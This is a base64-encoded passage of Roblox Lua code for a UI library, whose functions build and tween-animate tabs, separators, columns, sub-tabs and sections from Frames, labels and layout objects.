faG9sZGVyIl0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZmcuY3VycmVudF9tdWx0aSA9IGRhdGEKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNsb3NlX2VsZW1lbnQoKQoJCQkJCQllbmQKCgkJCQkJCW11bHRpX2l0ZW1zWyAiYnV0dG9uIiBdLk1vdXNlQnV0dG9uMURvd246Q29ubmVjdChmdW5jdGlvbigpCgkJCQkJCQlkYXRhLm9wZW5fcGFnZSgpIAoJCQkJCQllbmQpCgoJCQkJCQljZmcucGFnZXNbI2NmZy5wYWdlcyArIDFdID0gc2V0bWV0YXRhYmxlKGRhdGEsIGxpYnJhcnkpCiAgICAgICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgICAgICBjZmcucGFnZXNbMV0ub3Blbl9wYWdlKCkKICAgICAgICAgICAgICAgIC0tCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5vcGVuX3RhYigpIAogICAgICAgICAgICAgICAgbG9jYWwgc2VsZWN0ZWRfdGFiID0gc2VsZi5zZWxlY3RlZF90YWIKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgc2VsZWN0ZWRfdGFiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZWN0ZWRfdGFiWyA0IF0gfj0gaXRlbXNbICJ0YWJfaG9sZGVyIiBdIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaXRlbXNbICJnbG9iYWxfZmFkZSIgXS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihzZWxmLml0ZW1zWyAiZ2xvYmFsX2ZhZGUiIF0sIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC40KQogICAgICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDQgXS5TaXplID0gZGltMigxLCAtMjE2LCAxLCAtMTAxKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKHNlbGVjdGVkX3RhYlsgMSBdLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oc2VsZWN0ZWRfdGFiWyAyIF0sIHtJbWFnZUNvbG9yMyA9IHJnYig3MiwgNzIsIDczKX0pCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihzZWxlY3RlZF90YWJbIDMgXSwge1RleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Myl9KQoKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDQgXS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDQgXS5QYXJlbnQgPSBsaWJyYXJ5WyAiY2FjaGUiIF0KICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDUgXS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDUgXS5QYXJlbnQgPSBsaWJyYXJ5WyAiY2FjaGUiIF0KICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJidXR0b24iIF0sIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiaWNvbiIgXSwge0ltYWdlQ29sb3IzID0gdGhlbWVzLnByZXNldC5hY2NlbnR9KQogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgIm5hbWUiIF0sIHtUZXh0Q29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpfSkKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJ0YWJfaG9sZGVyIiBdLCB7U2l6ZSA9IGRpbTIoMSwgLTE5NiwgMSwgLTgxKX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC40KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInRhYl9ob2xkZXIiIF0uVmlzaWJsZSA9IHRydWUgCiAgICAgICAgICAgICAgICBpdGVtc1sgInRhYl9ob2xkZXIiIF0uUGFyZW50ID0gc2VsZi5pdGVtc1sgIm1haW4iIF0KICAgICAgICAgICAgICAgIGl0ZW1zWyAibXVsdGlfc2VjdGlvbl9idXR0b25faG9sZGVyIiBdLlZpc2libGUgPSB0cnVlIAogICAgICAgICAgICAgICAgaXRlbXNbICJtdWx0aV9zZWN0aW9uX2J1dHRvbl9ob2xkZXIiIF0uUGFyZW50ID0gc2VsZi5pdGVtc1sgIm11bHRpX2hvbGRlciIgXQoKICAgICAgICAgICAgICAgIHNlbGYuc2VsZWN0ZWRfdGFiID0gewogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiaWNvbiIgXTsKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgIm5hbWUiIF07CiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJ0YWJfaG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAibXVsdGlfc2VjdGlvbl9idXR0b25faG9sZGVyIiBdOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y2xvc2VfZWxlbWVudCgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaXRlbXNbICJidXR0b24iIF0uTW91c2VCdXR0b24xRG93bjpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGNmZy5vcGVuX3RhYigpCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG5vdCBzZWxmLnNlbGVjdGVkX3RhYiB0aGVuIAogICAgICAgICAgICAgICAgY2ZnLm9wZW5fdGFiKHRydWUpIAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHJldHVybiB1bnBhY2soY2ZnLnBhZ2VzKQogICAgICAgIGVuZAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnNlcGVyYXRvcihwcm9wZXJ0aWVzKQogICAgICAgICAgICBsb2NhbCBjZmcgPSB7aXRlbXMgPSB7fSwgbmFtZSA9IHByb3BlcnRpZXMuTmFtZSBvciBwcm9wZXJ0aWVzLm5hbWUgb3IgIkdlbmVyYWwifQoKICAgICAgICAgICAgbG9jYWwgaXRlbXMgPSBjZmcuaXRlbXMgZG8gCiAgICAgICAgICAgICAgICBpdGVtc1sgIm5hbWUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Myk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSBjZmcubmFtZTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiYnV0dG9uX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgNDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7IAogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibmFtZSIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0xlZnQgPSBkaW0oMCwgNSkKICAgICAgICAgICAgICAgIH0pOyAgICAgICAgICAgICAgICAKICAgICAgICAgICAgZW5kOyAgICAKCiAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgIGVuZCAKCiAgICAgICAgLS0gTWlzY2VsbGFuZW91cyAKICAgICAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpjb2x1bW4ocHJvcGVydGllcykgCiAgICAgICAgICAgICAgICBsb2NhbCBjZmcgPSB7aXRlbXMgPSB7fSwgc2l6ZSA9IHByb3BlcnRpZXMuc2l6ZSBvciAxfQoKICAgICAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJjb2x1bW4iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZlsgInBhcmVudCIgXSBvciBzZWxmLml0ZW1zWyJ0YWJfcGFyZW50Il07CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCBjZmcuc2l6ZSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdCb3R0b20gPSBkaW0oMCwgMTApOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNvbHVtbiIgXQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2x1bW4iIF07CiAgICAgICAgICAgICAgICAgICAgICAgIEhvcml6b250YWxGbGV4ID0gRW51bS5VSUZsZXhBbGlnbm1lbnQuRmlsbDsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZyA9IGRpbSgwLCAxMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEZpbGxEaXJlY3Rpb24gPSBFbnVtLkZpbGxEaXJlY3Rpb24uVmVydGljYWw7CiAgICAgICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBlbmQgCgogICAgICAgICAgICAgICAgcmV0dXJuIHNldG1ldGF0YWJsZShjZmcsIGxpYnJhcnkpCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6c3ViX3RhYihwcm9wZXJ0aWVzKSAKICAgICAgICAgICAgICAgIGxvY2FsIGNmZyA9IHtpdGVtcyA9IHt9LCBvcmRlciA9IHByb3BlcnRpZXMub3JkZXIgb3IgMDsgc2l6ZSA9IHByb3BlcnRpZXMuc2l6ZSBvciAxfQoKICAgICAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgInRhYl9wYXJlbnQiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZi5pdGVtc1sgInRhYiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLDAsY2ZnLnNpemUsMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgVmlzaWJsZSA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZpbGxEaXJlY3Rpb24gPSBFbnVtLkZpbGxEaXJlY3Rpb24uSG9yaXpvbnRhbDsKICAgICAgICAgICAgICAgICAgICAgICAgSG9yaXpvbnRhbEZsZXggPSBFbnVtLlVJRmxleEFsaWdubWVudC5GaWxsOwogICAgICAgICAgICAgICAgICAgICAgICBWZXJ0aWNhbEZsZXggPSBFbnVtLlVJRmxleEFsaWdubWVudC5GaWxsOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInRhYl9wYXJlbnQiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgcmV0dXJuIHNldG1ldGF0YWJsZShjZmcsIGxpYnJhcnkpCiAgICAgICAgICAgIGVuZCAKICAgICAgICAtLQoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnNlY3Rpb24ocHJvcGVydGllcykKICAgICAgICAgICAgbG9jYWwgY2ZnID0gewogICAgICAgICAgICAgICAgbmFtZSA9IHByb3BlcnRpZXMubmFtZSBvciBwcm9wZXJ0aWVzLk5hbWUgb3IgInNlY3Rpb24iOyAKICAgICAgICAgICAgICAgIHNpZGUgPSBwcm9wZXJ0aWVzLnNpZGUgb3IgcHJvcGVydGllcy5TaWRlIG9yICJsZWZ0IjsKICAgICAgICAgICAgICAgIGRlZmF1bHQgPSBwcm9wZXJ0aWVzLmRlZmF1bHQgb3IgcHJvcGVydGllcy5EZWZhdWx0IG9yIGZhbHNlOwogICAgICAgICAgICAgICAgc2l6ZSA9IHByb3BlcnRpZXMuc2l6ZSBvciBwcm9wZXJ0aWVzLlNpemUgb3Igc2VsZi5zaXplIG9yIDAuNTsgCiAgICAgICAgICAgICAgICBpY29uID0gcHJvcGVydGllcy5pY29uIG9yIHByb3BlcnRpZXMuSWNvbiBvciAiaHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD02MDIyNjY4ODk4IjsKICAgICAgICAgICAgICAgIGZhZGluZ190b2dnbGUgPSBwcm9wZXJ0aWVzLmZhZGluZyBvciBwcm9wZXJ0aWVzLkZhZGluZyBvciBmYWxzZTsKICAgICAgICAgICAgICAgIGl0ZW1zID0ge307CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8gCiAgICAgICAgICAgICAgICBpdGVtc1sgIm91dGxpbmUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiY29sdW1uIiBdOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCBjZmcuc2l6ZSwgLTMpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNSwgMjUsIDI5KQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJvdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA3KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAiaW5saW5lIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJvdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTIsIDEsIC0yKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjIsIDIyLCAyNCkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImlubGluZSIgXTsKICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInNjcm9sbGluZyIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiU2Nyb2xsaW5nRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIFNjcm9sbEJhckltYWdlQ29sb3IzID0gcmdiKDQ0LCA0NCwgNDYpOwogICAgICAgICAgICAgICAgICAgIEFjdGl2ZSA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljQ2FudmFzU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5ZOwogICAgICAgICAgICAgICAgICAgIFNjcm9sbEJhclRoaWNrbmVzcyA9IDI7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMSwgLTQwKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMCwgMCwgMzUpOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQ2FudmFzU2l6ZSA9IGRpbTIoMCwgMCwgMCwgMCkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgImVsZW1lbnRzIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2Nyb2xsaW5nIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxMCwgMCwgMTApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlMaXN0TGF5b3V0IiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImVsZW1lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgMTApOwogICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdCb3R0b20gPSBkaW0oMCwgMTUpOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiZWxlbWVudHMiIF0KICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgImJ1dHRvbiIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICBBdXRvQnV0dG9uQ29sb3IgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm91dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEsIDAsIDEpOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yLCAwLCAzNSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE2OwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMTksIDE5LCAyMSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJU3Ryb2tlIiAsIHsKICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYigyMywgMjMsIDI5KTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICBFbmFibGVkID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgQXBwbHlTdHJva2VNb2RlID0gRW51bS5BcHBseVN0cm9rZU1vZGUuQm9yZGVyCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJidXR0b24iIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDcpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJJY29uIiBdID0gbGlicmFyeTpjcmVhdGUoICJJbWFnZUxhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICBJbWFnZUNvbG9yMyA9IHRoZW1lcy5wcmVzZXQuYWNjZW50OwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMCwgMC41KTsKICAgICAgICAgICAgICAgICAgICBJbWFnZSA9IGNmZy5pY29uOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxMCwgMC41LCAwKTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAyMiwgMCwgMjIpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7IGxpYnJhcnk6YXBwbHlfdGhlbWUoaXRlbXNbICJJY29uIiBdLCAiYWNjZW50IiwgIkltYWdlQ29sb3IzIik7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGl0ZW1zWyAic2VjdGlvbl90aXRsZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA0MCwgMCwgLTEpOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAxKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dH